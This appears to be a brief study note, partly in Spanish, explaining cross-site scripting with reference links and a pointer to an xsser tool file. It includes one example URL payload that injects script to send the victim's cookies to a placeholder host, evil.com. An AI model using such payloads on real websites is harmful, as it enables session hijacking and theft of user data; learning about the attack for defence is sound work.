http://support.detectify.com/customer/portal/articles/1711512-cross-site-scripting
https://www.google.com/about/appsecurity/learning/xss/

enables attackers to inject client-side scripts into web pages viewed by users
The attacker may gain access to users cookies, session IDs, passwords, private messages etc.

La idea es crear una url inyectando código javascript. El dominio de la web será lícito.
Cuando el cliente abra la URL, el código inyectado puede robar datos del cliente como las cookies.

http://example.com/search.php?query=<script>document.InnerHTML += "<img src='http://evil.com/?cookie="+document.cookie+" />";</script>


# Atacar
xsser.md
